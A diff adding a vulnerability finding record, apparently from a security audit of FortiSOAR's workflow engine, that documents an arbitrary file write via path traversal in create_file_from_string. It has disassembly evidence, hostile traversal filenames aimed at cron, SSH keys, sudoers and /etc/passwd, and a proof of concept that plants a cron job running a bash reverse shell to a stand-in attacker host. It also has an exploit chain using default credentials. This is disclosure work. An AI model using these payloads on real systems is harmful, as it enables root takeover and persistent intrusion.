@@ -2452,3 +2452,84 @@ FSR_F36_CHECK_FILE_TRAVERSAL_COMMONPREFIX_BYPASS = {
         "Exploitability gated on TMP_FILE_ROOT lacking trailing separator (unverified -- check settings)."
     ),
 }
+
+FSR_F37_CREATE_FILE_FROM_STRING_UNGUARDED_WRITE = {
+    "id": "FSR-F37",
+    "title": "create_file_from_string has no path traversal check -- arbitrary file write",
+    "severity": "CRITICAL",
+    "cvss": "9.1",
+    "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H",
+    "cwe": "CWE-22",
+    "component": "cyops-workflow (builtins/files.so -- create_file_from_string)",
+    "binary": "/opt/cyops-workflow/sealab/workflow/builtins/files.so",
+    "disasm_evidence": {
+        "func_isra": "files.so VA 0x2ac20 (__pyx_pf_8workflow_8builtins_5files_20create_file_from_string.isra.32, 12714B)",
+        "filename_load": (
+            "0x2afc0: mov rsi, [__pyx_n_u_filename]  ; 'filename' attr string\n"
+            "0x2afc7: mov rdi, [rsp+0x18]            ; kwargs dict\n"
+            "0x2afcf: call __Pyx_PyDict_GetItemDefault  ; rbx = kwargs['filename'] (raw user string)"
+        ),
+        "path_ops_absent": (
+            "BSS scan of ISR 0x2ac20-0x2ddd0: zero refs to\n"
+            "  __pyx_n_s_abspath, __pyx_n_s_normpath, __pyx_n_s_relpath,\n"
+            "  __pyx_n_s_check_file_traversal, __pyx_n_s_SuspiciousFileOperation,\n"
+            "  __pyx_n_s_commonprefix, __pyx_n_s_realpath\n"
+            "Only path ops present: __pyx_n_s_join (0x2b073) and __pyx_n_s_TMP_FILE_ROOT (0x2b0e9)"
+        ),
+        "join_call": (
+            "0x2b028-0x2b045: getattr(cached_os_module, 'path') -> r12 (os.path)\n"
+            "0x2b073: mov rsi, [__pyx_n_s_join]  ; 'join' attribute\n"
+            "0x2b08a: call rax  ; os.path.join() callable retrieved\n"
+            "0x2b0e9: getattr(settings, 'TMP_FILE_ROOT') -> r13\n"
+            "0x2b206: call r14  ; os.path.join(r13=TMP_FILE_ROOT, rbx=user_filename) -> rbp"
+        ),
+        "open_call": (
+            "0x2b2a7: mov rbp, [__pyx_builtin_open]  ; Python builtin open\n"
+            "0x2b2b7: mov rax, [__pyx_n_u_w]         ; write mode 'w'\n"
+            "0x2b30d: call r15  ; open(join_result, 'w') -> file object\n"
+            "0x2b57e: ref __pyx_n_s_write             ; file.write(content)"
+        ),
+        "check_absent_contrast": (
+            "upload_to_url (0x19a71) and create_attachment (0x1c7fe) both call\n"
+            "_check_file_traversal via __pyx_n_s_check_file_traversal BSS lookup.\n"
+            "create_file_from_string has ZERO references to that BSS symbol."
+        ),
+    },
+    "root_cause": (
+        "create_file_from_string extracts the user-supplied 'filename' kwarg from the playbook "
+        "step parameters, passes it directly to os.path.join(settings.TMP_FILE_ROOT, filename), "
+        "then opens the resulting path in write mode. "
+        "No call to _check_file_traversal, no abspath, no normpath, no startswith check. "
+        "Sibling functions upload_to_url and create_attachment both call _check_file_traversal "
+        "before writing -- the check was added inconsistently and missed for create_file_from_string."
+    ),
+    "impact": (
+        "Authenticated FortiSOAR user with playbook 'Create File From String' step access can "
+        "write arbitrary content to any path on the filesystem:\n"
+        "  filename='../../../etc/cron.d/evil'  -> write cron job -> root command execution\n"
+        "  filename='../../../root/.ssh/authorized_keys'  -> SSH key injection -> persistent access\n"
+        "  filename='../../../etc/sudoers.d/evil'  -> sudoers entry -> privilege escalation\n"
+        "  filename='/etc/passwd'  -> os.path.join discards TMP_FILE_ROOT for absolute paths -> overwrite /etc/passwd\n"
+        "Unlike FSR-F36 (which has a broken check), FSR-F37 has NO check at all. "
+        "Exploitation requires only the ability to create/edit a playbook step."
+    ),
+    "precondition": "Authenticated user with playbook create/edit permission; 'Create File From String' step available.",
+    "poc": (
+        "Playbook step: Create File From String\n"
+        "  content: '* * * * * root /bin/bash -i >& /dev/tcp/attacker/4444 0>&1'\n"
+        "  filename: '../../../etc/cron.d/fortisoar_backdoor'\n"
+        "Result: cron job written to /etc/cron.d/fortisoar_backdoor; root shell within 60s."
+    ),
+    "chain": [
+        "FSR-F37 + FSR-F4 (csadmin:changeme): unauthenticated -> admin -> arbitrary file write -> root RCE",
+        "FSR-F37 + FSR-F35 (expand_macros SSTI): write SSTI payload to template file, trigger via playbook",
+        "FSR-F37 standalone: authenticated playbook user -> write cron/sudoers/ssh keys -> root",
+        "FSR-F37 supercedes FSR-F36: F37 needs no trailing-slash condition; exploitable unconditionally",
+    ],
+    "status": (
+        "CONFIRMED via BSS scan. ISR 0x2ac20 (12714B): zero refs to _check_file_traversal, "
+        "abspath, normpath, relpath, SuspiciousFileOperation. "
+        "filename kwarg loaded raw at 0x2afcf, passed to join at 0x2b206, opened at 0x2b30d. "
+        "No sanitization between kwarg extraction and file open."
+    ),
+}
